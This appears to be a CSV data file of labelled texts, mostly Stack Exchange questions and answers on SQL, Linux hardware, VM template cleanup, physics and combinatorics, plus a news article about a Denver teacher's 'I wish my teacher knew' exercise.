A,C
"<p>Bad edits aren't limited to suggested edits. We tend not to notice the bad non-suggested edits because they don't get a minimum of two reviewers involved (three on SO).</p>

<p>One thing that we're very bad at is teaching what is a good edit and what is a bad edit. I've reviewed a lot of suggested edits in my time. I'm not in people's mind, of course, but I believe that in a majority of cases, the editors thought they were doing a good thing. Not all the time — I've also seen clear badge hunters — but often the editors gave me the impression that they were attempting to improve the site.</p>

<p>Even when I'd managed to reject a suggested edit in time and left some specific feedback such as “Please do not use code markup for proper names, only for code” or “Wikipedia content must be attributed and does not make an appropriate tag wiki in 99% of the cases”, it seemed a bit pointless. The editor is, practically speaking, never going to see that feedback.</p>

<p>An absolutely necessary change to improve the quality of edits is to <strong><a href=""https://meta.stackexchange.com/questions/120624/decision-on-rejected-edits-should-be-displayed-as-a-notification-to-the-editor"">notify editors of the reasons for rejected edits</a></strong>.</p>

<p>A lot of these people would be willing to learn, but we aren't seriously trying to teach them!</p>

<p>When bad editors become reviewers, they'll keep applying what they're used to, so the system tends to perpetuate itself. Merely teaching editors would start a virtuous circle which I would expect to drastically improve reviews as well, after a delay.</p>

<p>An argument in favor of this virtuous circle theory is that I've observed far more bad suggested edits on Stack Overflow than on other sites (tag wikis excluded).</p>

<p>If this isn't enough — but let's first do it and see the results after 6­–8 weeks — then we should teach reviewers as well — and editors with the editing privilege, for that matter. This could take the form of improved audits for suggested edits. Right now, we throw garbage as people and make sure they're rejecting it as such, which catches robo-reviewers, but not incompetent but well-meaning reviewers. We should have audits that reflect the actual typical kinds of good and bad edits that the sites see. (I'm sure this has been raised before on MSO.)</p>

<p>Discussions on MSO show that many people who review edits have never read the <a href=""https://stackoverflow.com/help/editing"">editing guidelines</a>, or didn't really pay attention to them. Since suggested edit review doesn't lack manpower, we could make becoming a reviewer more difficult, requiring passing several audits (drawn from real-life cases) <a href=""https://meta.stackexchange.com/questions/214541/give-new-edit-reviewers-some-audits-to-begin-with"">before getting access to real posts</a>. This could be done on Stack Overflow as a stopgap measure while attempting to shift the balance after starting to educate suggesting editors, in order to ensure that the feedback that editors get is correct.</p>
",0
"<p>All manuals focus on terminal commands. The use of the terminal is not the problem. But the return is incomprehensible. For example: </p>

<pre><code>lsusb -t
/:  Bus 06.Port 1: Dev 1, Class=root_hub,     Driver=xhci_hcd/2p, 5000M
    |__ Port 2: Dev 3, If 0, Class=Mass Storage, Driver=usb-storage, 5000M
/:  Bus 05.Port 1: Dev 1, Class=root_hub, Driver=xhci_hcd/2p, 480M
|__ Port 1: Dev 2, If 0, Class=Hub, Driver=hub/4p, 480M
/:  Bus 04.Port 1: Dev 1, Class=root_hub, Driver=xhci_hcd/4p, 5000M
    |__ Port 2: Dev 2, If 0, Class=Hub, Driver=hub/4p, 5000M
        |__ Port 1: Dev 3, If 0, Class=Hub, Driver=hub/4p, 5000M
/:  Bus 03.Port 1: Dev 1, Class=root_hub, Driver=xhci_hcd/4p, 480M
    |__ Port 2: Dev 2, If 0, Class=Hub, Driver=hub/4p, 480M
        |__ Port 1: Dev 4, If 0, Class=Hub, Driver=hub/4p, 480M
/:  Bus 02.Port 1: Dev 1, Class=root_hub, Driver=ehci-pci/2p, 480M
    |__ Port 1: Dev 2, If 0, Class=Hub, Driver=hub/8p, 480M
    |__ Port 5: Dev 3, If 0, Class=Video, Driver=uvcvideo, 480M
    |__ Port 5: Dev 3, If 1, Class=Video, Driver=uvcvideo, 480M
    |__ Port 5: Dev 3, If 2, Class=Audio, Driver=snd-usb-audio, 480M
    |__ Port 5: Dev 3, If 3, Class=Audio, Driver=snd-usb-audio, 480M
    |__ Port 6: Dev 4, If 0, Class=Wireless, Driver=btusb, 12M
    |__ Port 6: Dev 4, If 1, Class=Wireless, Driver=btusb, 12M
/:  Bus 01.Port 1: Dev 1, Class=root_hub, Driver=ehci-pci/2p, 480M
|__ Port 1: Dev 2, If 0, Class=Hub, Driver=hub/6p, 480M
    |__ Port 2: Dev 3, If 0, Class=Mass Storage, Driver=usb-storage, 480M
    |__ Port 3: Dev 4, If 0, Class=Human Interface Device, Driver=usbhid, 12M
    |__ Port 3: Dev 4, If 1, Class=Human Interface Device, Driver=usbhid, 12M
    |__ Port 3: Dev 4, If 2, Class=Human Interface Device, Driver=usbhid, 12M
    |__ Port 4: Dev 5, If 0, Class=Human Interface Device, Driver=usbhid, 12M
    |__ Port 4: Dev 5, If 1, Class=Human Interface Device, Driver=usbhid, 12M
    |__ Port 4: Dev 5, If 2, Class=Human Interface Device, Driver=usbhid, 12M
</code></pre>

<p>Or:</p>

<pre><code>lsblk
NAME   MAJ:MIN RM   SIZE RO TYPE MOUNTPOINT
sda      8:0    0   2,7T  0 disk 
├─sda1   8:1    0     8G  0 part [SWAP]
└─sda2   8:2    0   2,7T  0 part /home
sdb      8:16   0 232,9G  0 disk 
├─sdb1   8:17   0   512M  0 part /boot/efi
├─sdb2   8:18   0 224,5G  0 part /
└─sdb3   8:19   0     8G  0 part [SWAP]
sdg      8:96   1  28,9G  0 disk 
├─sdg1   8:97   1   1,4G  0 part /media/ernst/Ubuntu 18.04 LTS amd64
└─sdg2   8:98   1   2,3M  0 part 
</code></pre>

<p>I know ""/media/ernst/Ubuntu 18.04 LTS amd64"" is using a USB-stick using a blue USB3-switch connected to USB3-cable connected to PC blue USB3 port. But how can I make sure these 4 hardwares are really using USB3 speed. </p>

<blockquote>
  <p>USB3-port ► USB3-cable ► USB3-switch ► USB-stick</p>
</blockquote>

<p>I bought the cable from a Chinese website, It's cheap so I do not really trust these stuff. I think that information like 12M, 480M and 5000M. Is that the speed per second?</p>

<p>If it's not really USB3, I can alway send it back to China. lol</p>
",0
"<p>What is the best way to get count for all the records, where case evaluates to one for all the conditions. I have the query as:</p>

<pre><code>SELECT  
    uuid , 
    COUNT( CASE WHEN (( dt = 1 or level0 = 'Profile' ) and level1 = 'Age_Group' and level2 = '18-24' ) THEN 1 END) AS 'Profile &gt; Age &gt; 18-24',
    COUNT( CASE WHEN (( dt = 1 or level0 = 'Profile' ) and level1 = 'Age_Group' and level2 = '25-34' ) THEN 1 END) AS 'Profile &gt; Age &gt; 25-34',
    COUNT( CASE WHEN (( dt = 1 or level0 = 'Profile' ) and level1 = 'Gender' and level2 = 'M' ) THEN 1 END) AS 'Profile &gt; Gender &gt; M',
    COUNT( CASE WHEN (( dt = 1 or level0 = 'Profile' ) and level1 = 'State' and level2 = 'QLD' ) THEN 1 END) AS 'Profile &gt; State &gt; QLD',
    COUNT( CASE WHEN (dt = 2 and level0 = 'Insurance'  and level1 = 'Health' ) THEN 1 END) AS 'Interest &gt; Insurance &gt; Health',
    COUNT( CASE WHEN (( dt = 1 or level0 = 'Profile' ) and level1 = 'Kids' ) THEN 1 END) AS 'Profile &gt; Kids'
FROM segmentdata sd
WHERE sd.created &gt;= DATE_SUB(NOW(), INTERVAL 365 DAY)
GROUP BY sd.uuid;
</code></pre>

<p>The above query gives me a 1 and 0. I need to get a list of all one, for all the conditions and count them.</p>

<p>I have tried:</p>

<pre><code>SELECT 
    COUNT(CASE WHEN ((asd.`Profile &gt; Age &gt; 18-24` OR asd.`Profile &gt; Age &gt; 25-34`) 
        AND (asd.`Profile &gt; Gender &gt; M` AND asd.`Profile &gt; State &gt; QLD` 
        AND asd.`Interest &gt; Insurance &gt; Health`)
        AND NOT (asd.`Profile &gt; Kids`)) THEN 1 END )
FROM (
    SELECT
        uuid , 
            COUNT( CASE WHEN (( dt = 1 or level0 = 'Profile' ) and level1 = 'Age_Group'  and level2 = '18-24' )  THEN 1 END) AS 'Profile &gt; Age &gt; 18-24',
            COUNT( CASE WHEN (( dt = 1 or level0 = 'Profile' ) and level1 = 'Age_Group'  and level2 = '25-34' ) THEN 1 END) AS 'Profile &gt; Age &gt; 25-34',
            COUNT( CASE WHEN (( dt = 1 or level0 = 'Profile' ) and level1 = 'Gender'  and level2 = 'M' ) THEN 1 END) AS 'Profile &gt; Gender &gt; M',
            COUNT( CASE WHEN (( dt = 1 or level0 = 'Profile' ) and level1 = 'State'  and level2 = 'QLD' ) THEN 1 END) AS 'Profile &gt; State &gt; QLD',
            COUNT(CASE WHEN (dt = 2 and level0 = 'Insurance'  and level1 = 'Health' ) THEN 1 END) AS 'Interest &gt; Insurance &gt; Health',
            COUNT(CASE WHEN (( dt = 1 or level0 = 'Profile' ) and level1 = 'Kids' ) THEN 1 END) AS 'Profile &gt; Kids'
         FROM segmentdata sd
         WHERE sd.created &gt;= DATE_SUB(NOW(), INTERVAL 365 DAY)
         GROUP BY sd.uuid
     ) asd
</code></pre>

<p>But the above query takes a lot of time! What is the best way to do this? The above query takes about 1 -2 minutes. I need to reduce that time drastically. Please help. This is quite urgent. </p>

<p>My desired results are that the query runs as quickly as possible as well as gives me a count. For eg the above should give me the count from the table 'segmentdata'  for All 18-34 males in QLD interested in Health insurance, without kids.</p>

<p>Thanks</p>
",0
"<p>A general policy is to let the reporting layer handle things like only printing ParentIncome once.  However, since you are delivering a spreadsheet that will be used by others in who knows what manner, then I suppose you are stuck.</p>

<p>Because of the knowledge required you will need to develop some extra information (MIN, MAX, first, last, etc.) that is not known by a single row.  There are dodges different from ROW_NUMBER() OVER (PARTITION...), but there will still be an extra step.  </p>

<p>See the following:</p>

<pre><code>CREATE TABLE #parent
(ParentNum INT,
 ParentName VARCHAR(20),
 ParentIncome INT);

CREATE TABLE #child
(ChildNum INT,
 ChildParentNum INT,
 ChildName VARCHAR(20),
 ChildAllowance INT);

INSERT INTO #parent VALUES(10,'John',50000);
INSERT INTO #parent VALUES(20,'Jane',55000);
INSERT INTO #parent VALUES(30,'Jackie',90000);

INSERT INTO #child VALUES(1,10,'Johnny',5)
INSERT INTO #child VALUES(2,20,'Jackie',10)
INSERT INTO #child VALUES(3,20,'Billy',5)
INSERT INTO #child VALUES(4,20,'Sally',5)
INSERT INTO #child VALUES(5,30,'Monique',0)

-- Basic approach you may be using
</code></pre>

<p>See this example <a href=""http://sqlfiddle.com/#!3/7888e/5"" rel=""nofollow"">SQL Fiddle #1</a></p>

<pre><code>SELECT pc.ParentName, pc.ParentNum,
    CASE WHEN pc.RowNum = 1 THEN CAST(pc.ParentIncome AS VARCHAR(10)) ELSE '' END as ParentIncome,
    pc.ChildName, pc.ChildNum, pc.ChildAllowance
FROM (SELECT p.ParentNum, p.ParentName, p.ParentIncome, 
         c.ChildNum, c.ChildParentNum, c.ChildName, c.ChildAllowance,
         ROW_NUMBER() OVER (PARTITION BY ParentNum ORDER BY ParentNum) AS RowNum
       FROM #parent p JOIN #child c ON p.ParentNum = c.ChildParentNum) AS pc
ORDER BY pc.ParentNum, pc.ChildNum 

    -- An alternative, but still using a subselect for one element
</code></pre>

<p>See this example: <a href=""http://sqlfiddle.com/#!3/7888e/6"" rel=""nofollow"">SQL Fiddle #2</a></p>

<pre><code>SELECT  p.ParentName, p.ParentNum, 
        CASE WHEN c.ChildNum = mc.MinChild THEN CAST (ParentIncome AS VARCHAR(10)) ELSE '' END AS ParentIncome,
        c.ChildName, c.ChildNum, c.ChildAllowance
       FROM #parent p 
          JOIN #child as c 
             ON p.ParentNum = c.ChildParentNum
          -- This subselect gives the MIN (or First) ChildNum per Parent
          JOIN (SELECT ChildParentNum, MIN(ChildNum) AS MinChild
                  FROM #child
                  GROUP BY ChildParentNum) AS mc 
             ON mc.ChildParentNum = c.ChildParentNum 
ORDER BY p.ParentNum, c.ChildNum 

drop table #parent
drop table #child
</code></pre>

<p>Notice that I cast the ParentIncome as a VARCHAR(10) so that the datatype would be of the same type as the empty income of ''.  I originally used a NULL instead of a blank, but that might give you EXCEL problems.</p>

<p>Is it worth doing things this way?  It is up to you, but it primarily depends on what you like best.  The ROW_NUMBER() is a more powerful operator than MIN() and gives you more options, but in this case it appears that a MIN() will work for you.</p>
",0
"<p>Suppose the uncertainty in a time measurement does not increase with the length of time being measured. (This is usually a good assumption in most modern experiments.) Let's also assume that in the <span class=""math-container"">$N$</span>-period single measurement, we know exactly how many periods we're measuring (which is a good assumption as long as your uncertainty is much smaller than the period). Let's compare the total uncertainty on the two techniques' final result.</p>

<hr>

<p>Suppose you make <span class=""math-container"">$N$</span> measurements of one period. Each measurement has an uncertainty <span class=""math-container"">$\sigma_t$</span>. To obtain the final result, you take the average of the <span class=""math-container"">$N$</span> measurements (the sum divided by <span class=""math-container"">$N$</span>). The uncertainty <span class=""math-container"">$\sigma_{t,sum}$</span> on the sum of <span class=""math-container"">$N$</span> quantities is the quadrature sum</p>

<p><span class=""math-container"">$$\sigma_{t,sum} = \sqrt{(\sigma_t)^2 + (\sigma_t)^2 + ... + (\sigma_t)^2}=\sqrt{N(\sigma_t)^2}=\sqrt{N}\sigma_t$$</span></p>

<p>Since the average is the sum divided by <span class=""math-container"">$N$</span> (which is exact), the uncertainty in the average is also the uncertainty in the sum divided by <span class=""math-container"">$N$</span>:</p>

<p><span class=""math-container"">$$\sigma_{t,avg} = \frac{\sigma_t}{\sqrt{N}}$$</span></p>

<hr>

<p>Now suppose you make a single measurement of <span class=""math-container"">$N$</span> periods. Because we assumed that the uncertainty in the time measurement does not increase with the length of time being measured, the uncertainty in this measurement is still at most <span class=""math-container"">$\sigma_t$</span>. For this measurement, we find the period by dividing by <span class=""math-container"">$N$</span>. Since <span class=""math-container"">$N$</span> is exact, the uncertainty in the period from this measurement is</p>

<p><span class=""math-container"">$$\sigma_{t,single}=\frac{\sigma_t}{N}$$</span></p>

<hr>

<p>So, assuming that our above assumptions hold, making a single measurement produces a more precise result, especially as <span class=""math-container"">$N$</span> grows large. However, if the above assumptions are broken, then this may not be true any longer. For example, if the uncertainty in the time measured grows with the length of time measured (for example, if you're reading from a screen that has a finite precision, and longer time intervals force it to be less precise in displaying the reading; alternatively, if your timing device's measurements begin to drift from accuracy over long measurements, which is common with, for example, wind-up clocks), then the single measurement might not be the most precise result. In addition, if your time uncertainty is too large compared to the period, then you might also introduce an uncertainty in the number of periods you measured, which will affect the comparison of techniques in a more complicated way.</p>
",0
"<p>I am trying to draft a very simple data model for a multi-tenant database.</p>

<p>So far I have only 3 tables:</p>

<ul>
<li><strong>company</strong>: pretty much my tenant</li>
<li><strong>account</strong>: is part of one company and zero or more groups</li>
<li><strong>account_group</strong>: same as account: one company and zero or more accounts</li>
</ul>

<p>Here is the SQL:</p>

<pre><code>CREATE TABLE company (
  name TEXT NOT NULL,

  PRIMARY KEY (name)
);

CREATE TABLE account (
  email_address TEXT NOT NULL,
  company_name TEXT NOT NULL,

  PRIMARY KEY (email_address),
  FOREIGN KEY (company_name) REFERENCES company (name)
);

CREATE TABLE account_group (
  name TEXT NOT NULL,
  company_name TEXT NOT NULL,

  PRIMARY KEY (name, company_name),
  FOREIGN KEY (company_name) REFERENCES company (name)
);

CREATE TABLE account_group_membership (
  account_group_name TEXT NOT NULL,
  account_group_company_name TEXT NOT NULL,
  account_email_address TEXT NOT NULL,

  PRIMARY KEY (account_group_name, account_group_company_name, account_email_address),
  FOREIGN KEY (account_group_name, account_group_company_name) REFERENCES account_group (name, company_name),
  FOREIGN KEY (account_email_address) REFERENCES account (email_address)
);
</code></pre>

<p>In this specific case, there is no constraint between the Account Company and Group Company.</p>

<p>After doing some search, I found <a href=""https://dba.stackexchange.com/questions/8025/constraint-many-to-many-table-between-two-child-tables"">this question</a> and tried to add the following to my <code>account_group_membership</code> table;</p>

<pre><code>CREATE TABLE account_group_membership (
  account_group_name TEXT NOT NULL,
  account_group_company_name TEXT NOT NULL,
  account_email_address TEXT NOT NULL,
  account_company_name TEXT NOT NULL,

  PRIMARY KEY (account_group_name, account_group_company_name, account_email_address),
  FOREIGN KEY (account_group_name, account_group_company_name) REFERENCES account_group (name, company_name),
  FOREIGN KEY (account_email_address, account_company_name) REFERENCES account (email_address, company_name),
  CONSTRAINT same_company CHECK (account_group_company_name == account_company_name)
);
</code></pre>

<p>Unfortunately this doesn't work since the <code>company_name</code> column of the <code>account</code> table is not unique.</p>

<p>I cannot:</p>

<ol>
<li>Make the column <code>company_name</code> unique since multiple accounts can be from the company.</li>
<li>Use <code>email_address</code> and <code>company_name</code> as primary key for an <code>account</code>. The <code>email_address</code> should be unique in the whole table. Also <code>account</code> will mostly be queried by <code>email_address</code> and from time to time by <code>company_name</code>.</li>
<li>See any other solution actually....</li>
</ol>

<p>So is there any simple way to do this (simple as in easy to understand and maintain) ? 
Alternatively, does having this problem, mean that there is something wrong going on in the design ?</p>
",0
"<p>I remember a problem I had to solve during a student programming contest in 2001. The problem was this one:</p>

<blockquote>
  <p>Given masses of 1, 7, 13, ... (I don't remember which masses, but there was a finite, determinate set of masses), design a function that determines whether a given weight can be weighed on a scale with this set of masses.</p>
</blockquote>

<p>I started with nested loops, but quickly hit a wall. Then I came to realize that I had to start with enumerating what can be done with the lighter masses before going on with the heavier ones. I could solve the problem with a lot of unnested loops.</p>

<p>Hadn't I been youthfully arrogant and self-sufficient at that time (and had I known about and practiced generating functions), I might have defined the problem with generating functions as such :</p>

<p>Define $f(x)$ as the OGF for the number of ways that a weight $n$ can be weighed given the set of masses.</p>

<p>What weight on the right pan can I weigh given a single mass of 1?</p>

<p>Three possibilities:</p>

<ul>
<li>If I put the mass on the left pan, I can weigh 1.</li>
<li>If I put the mass on the right pan, I can weigh -1.</li>
<li>If I don't use the mass, I can weigh 0.</li>
</ul>

<p>So there is one way to weigh $-1$, one way to weigh $0$, and one way to weigh $1$. The generating function for this mass is something like $x^{-1} + 1 + x$, which corresponds to:</p>

<p>$$
\frac{1 - x^3}{x(1-x)}
$$</p>

<p>The generating function for a single mass $m$ is $x^{-m} + 1 + x^m$, which is :</p>

<p>$$
\frac{1 - x^{3m}}{x^m(1-x^m)}
$$</p>

<p>Given a multiset $M$ of masses, $f$ is expressed as the product of the single mass generating functions:</p>

<p>$$
f(x) = \frac{\prod_{m \in M}(1 - x^{3m})}{x^{\sum_{m \in M}m}\prod_{m \in M}(1 - x^{m})}
$$</p>

<p>Now, given a package that can perform operations on polynomials, you just have to :</p>

<ul>
<li>Calculate both products.</li>
<li>Perform the division of these products, starting with the lowest degree. (which terminates)</li>
<li>Shift the polynomial (euclidian division by $x^k$, keeping the quotient and dumping the remainder)</li>
</ul>

<p>And you're done. Now your polynomial has the number of ways to weigh $w \ge 0$ at index $w$. The only input is the multiset of masses $M$.</p>

<p>I designed the algorithm using mathematically sound components. The main part of the algorithm, which is a polynomial division with lowest degree first, is linear and can be implemented by an off-the-shelf package. It may not be optimal, but it certainly performs better than what I did at the contest, and in a less error-prone way.</p>

<p>If you look closely at the division process, you quickly see that the remainder can be seen as the ""current hidden state"" at every state of the process, and the quotient as the result. The process terminates when the ""current hidden state"" reaches zero everywhere.</p>

<p>You can implement polynomials as arrays or, if they are really really sparse, as index-coefficient ordered lists, and this won't change the algorithm.</p>
",0
"<p>To understand the origin of <a href=""https://en.wikipedia.org/wiki/Black-body_radiation"" rel=""nofollow"">black body radiation</a>, which is what every material body with a temperature T has been measured to <a href=""https://en.wikipedia.org/wiki/Black-body_radiation#Planck.27s_law_of_black-body_radiation"" rel=""nofollow"">emit</a>, one has to go to quantum statistical mechanics.</p>

<p>Atoms and molecules, to start with, in any ensemble, interact with the electromagnetic radiation. At that level, the processes are quantum mechanical. In quantum mechanics the exchanges of, for example, gas molecules as they bounce off each other, are changes in energy levels of the electrons that compose them . The kinetic energy of one molecule raises the energy level of an electron in the molecule it hit, (by exchanging a <a href=""https://en.wikipedia.org/wiki/Virtual_particle"" rel=""nofollow"">virtual photon).</a> The now excited molecule releases the energy as a real photon in a random direction, the electron going back to the ground state. This photon has an arbitrary direction and there is a high probability it will escape the gas volume without interacting again, and be part of the black body radiation.</p>

<p>For fluids and solids, where the molecules are bonded and cannot freely move, there are the vibrational and rotational quantum mechanical degrees of freedom. The atoms and molecules still interact, transferring kinetic energy to electron pushing them to higher energy levels (by virtual photon exchanges), and electrons fall back to the quantum mechanical ground state and a real photon will be radiated, with a high probability of getting out of the material as black body radiation.</p>

<blockquote>
  <p>If an object has a temperature due to nonzero entropy, then it must radiate.</p>
</blockquote>

<p>The internal motions of particles in an ensemble have a kinetic energy which is what builds up the <a href=""http://hyperphysics.phy-astr.gsu.edu/hbase/kinetic/kintem.html"" rel=""nofollow"">thermodynamically defined temperature</a> observed macroscopically . So any ensemble of molecules with a non zero temperature has kinetic energy which will result in radiation as described above. </p>

<p>In the statistical mechanics <a href=""https://en.wikipedia.org/wiki/Entropy_%28statistical_thermodynamics%29"" rel=""nofollow"">definition of entropy</a> it is connected to the number of available microstates .   ""non zero entropy"" is a confusing way to define the existence of temperature, the syllogism is: if there is entropy, microstates exist, therefore kinetic energy, therefor temperature. A simpler concept  should be ""due to nonzero kinetic energies of the ensemble particles"". ( see <a href=""https://en.wikipedia.org/wiki/Entropy_%28statistical_thermodynamics%29#Counting_of_microstates"" rel=""nofollow"">this</a> about zero temperature and entropy)</p>

<blockquote>
  <p>Why must it radiate? </p>
</blockquote>

<p>Because of the inevitable interactions in  large statistical ensembles due to kinetic vibrational and rotational motions/energy.</p>
",0
"<p>I don't have access to our current cleanup script right now, but one of things we take into account is the appliance can maybe be deployed without running the proper customization steps. That means, for instance, the hostname on the original image might live on, and has to be reset before closing. We usually set ours to <code>localhost</code>.</p>

<p>With that in mind, these are extra steps you might need to take care of</p>

<ul>
<li>clean up <code>/etc/hosts</code>, <code>/etc/resolv.conf</code>, <code>/etc/sysconfig/network</code> of any customized values</li>
<li>in addition to removing the ifcfg files, don't forget to remove any route files (<code>/etc/sysconfig/network-scripts/route-eno*</code>), if you have them</li>
<li>rotate and clean up every single logfile, audit log and the wtmp file (don't remove the wtmp file, just <code>cat /dev/null &gt; /var/log/wtmp</code>), so they start up empty</li>
<li>clean up <code>/var/tmp</code> and <code>/tmp</code></li>
<li>clean up the vmware provisioning log, if you have it (iirc, <code>/var/log/vmware-imc/*</code>)</li>
<li>if you registered your template into something like RH Satellite, SpaceWalk, SuSE Manager or RHN itself, make sure to restore <code>/etc/sysconfig/rhn</code> or similar back to default values. From experience, <code>rm</code>'ing these is a bad idea. We usually just make a backup when first creating the image, and mv that back when closing it down. Same goes for <code>/etc/sysconfig/osad</code>, if your environment uses it.</li>
<li>remove any extra users that might've been created, and EVERY SINGLE password on the shadow file</li>
<li>make sure the initialization, first boot, post-deploy-customization scripts are actually set to run on first boot.</li>
</ul>

<p>Last, but not least, you can zero out every single filesystem plus the extra unused VG space, so you can better compress the image. We have a script that goes into every filesystem, dd's a bunch of zeroes until it fills up, then removes the file. Same for a VG with empty space, create an LV that fills 100%FREE, zero it out and remove it. After finishing these last steps (the last ones before powering down), you can use a trick depending on the kind of image you're creating:</p>

<ul>
<li>For VMWare, clone the image into a new VM, with the destination set as thin provisioning.. When doing this, all the contiguous zeros will be converted into nothing</li>
<li>For openstack/kvm images, you might want to convert them using qemu-img to qcow2 (if your provider supports it), and enable the compress flag: <code>qemu-img convert -f raw -O qcow2 -c source.raw destination.qcow2</code></li>
</ul>

<p>One thing we've taken from this process is, every time we run thru a new cycle of images, we learn of something new we could've added, usually only after it has shipped. This gets added to the next cycle, and so on.</p>

<p>EDIT: on the spirit of the ""every time we learn something new"", the following steps were added last time:</p>

<ul>
<li>yum history new</li>
<li>yum reinstall basesystem -y</li>
</ul>
",0
"When Kyle Schwartz started teaching third grade at Doull Elementary School in Denver, she wanted to get to know her students better. She asked them to finish the sentence “I wish my teacher knew. ” The responses were   for Ms. Schwartz. Some children were struggling with poverty (“I wish my teacher knew I don’t have pencils at home to do my homework”) an absent parent (“I wish my teacher knew that sometimes my reading log is not signed because my mom isn’t around a lot”) and a parent taken away (“I wish my teacher knew how much I miss my dad because he got deported to Mexico when I was 3 years old and I haven’t seen him in six years”). The lesson spurred Ms. Schwartz, now entering her fifth teaching year, to really understand what her students were facing outside the classroom to help them succeed at school. When she shared the lesson last year with others, it became a sensation, with the Twitter hashtag “#iwishmyteacherknew” going viral. Other teachers tried the exercise and had similar insights. Many sent her their students’ responses. In her recently published book, “I Wish My Teacher Knew: How One Question Can Change Everything For Our Kids,” Ms. Schwartz details how essential it is for teachers and families to be partners. “I really want families to know how intentional teachers are about creating a sense of community and creating relationships with kids,” Ms. Schwartz said. “Kids don’t learn when they don’t feel safe or valued. ” Melody Molinoff of Washington, D. C. who has two sons, ages 9 and 11, in the public school system, agreed. “Parents see the teacher as their partner in bringing up their child, and that’s a huge responsibility that we are putting on our teachers and our schools,” Ms. Molinoff said. “I always want my sons’ teachers to know what their challenges are, what they like, just more about them. ” Mary Clayman, a   teacher in the Washington public schools, said she has noticed the same thing from the other side of the desk. “I’ve taught over 500 kids so far in my career and parents in every grade want to know how their child is doing socially and emotionally, often times more so than whether they can multiply or divide quite yet,” Mrs. Clayman said. In her book, Ms. Schwartz writes about mistakes that might have been prevented if she had known her students better. She had a student named Chris who was obsessed with science. Ms. Schwartz thought she had done Chris a huge favor by securing a spot for him in a   summer camp. But she was unaware of the family’s financial struggles and it turned out that his parents could not afford to take time off from work to get Chris to camp. Ms. Schwartz said classrooms can become a supportive environment for students coping with grief. She suggests that schools have “grief and loss” inventories for students who have gone through a crisis, with input from families so that the child’s future teachers know what that student is dealing with. “As teachers, we know parents are the first and best teachers for their children and we want them to work with us,” she said.",0
"<p>In <em>all</em> these discussions about entanglement, all the measured observables of Alice always commute with those of Bob. Their degrees of freedom describe two factors ${\mathcal H}_A$ and ${\mathcal H}_B$ of the overall Hilbert space of possibilities which is the tensor product
$$ {\mathcal H} = {\mathcal H}_A\otimes {\mathcal H}_B $$
This factorization of the Hilbert space has to be the case by definition, otherwise the notion of the entanglement cannot be defined at all.</p>

<p>I think that you got confused by some forgotten indices. The observables may be the Pauli matrices but they still need a label that indicates whether it's Alice's or Bob's Pauli matrices. So we have three matrices $\sigma_i^A$ belonging to Alice, and three $\sigma_i^B$ to Bob. In the whole Hilbert space, these six operators may be written as the tensor products
$$ \sigma_i \otimes 1, \quad 1 \otimes \sigma_i $$
The first three operators obey the usual Pauli matrix algebra among themselves, and so do the last three. But each of the first three commutes with each of the last three.</p>

<p>Also, I think that it's always extremely misleading to use the adjective ""non-local"" for entangled states just because they are entangled. There is nothing non-local about them. Only theories may be local or non-local, according to whether they allow superluminal influences. </p>

<p>Quantum field theory strictly bans any non-locality; non-relativistic quantum mechanical theories may allow them but these non-localities play absolutely no role in the explanation of the entanglement and the resulting correlations. Indeed, the locality of these theories is tightly linked to the fact that all Alice's observables commute with all Bob's observables. In quantum field theory, locality is mathematically expressed by the fact that the quantum fields exactly commute at spacelike separation:
$$ \forall x,y\in M^4,\,\,(x-y)^2\lt 0: \quad [\phi(x^\alpha), \phi (x^{\prime \beta})]=0 $$
And the Wikipedia page you linked to doesn't ever use the adjective ""non-local"". It's something you added (unfortunately, popular books and pop-science articles do so all the time) and it is not correct.</p>

<p>Otherwise for a given choice of ""type of the experiment"" that you called $x$ or $y$, the projection operators always commute with each other. For two different values of $x$ but the same experimenter (e.g. both Alice), the projection operators generally don't commute, at least some of them don't. Otherwise they wouldn't be different. If all of the projection operators of Alice's for the values of $x_1$ and $x_2$ commuted with all others, one could unify these measurements into one and remove e.g. $x_2$ from the list of choices for $x$.</p>

<p>When one minimizes the sets of possible ""types of measurement"" and tries to minimize the dimension of the Hilbert spaces, he may find the usual examples of entangled states such as Bell's inequality or CHSH that qualitatively differ from any local hidden variable model in some qualitative way, and those can't be reduced further.</p>
",0
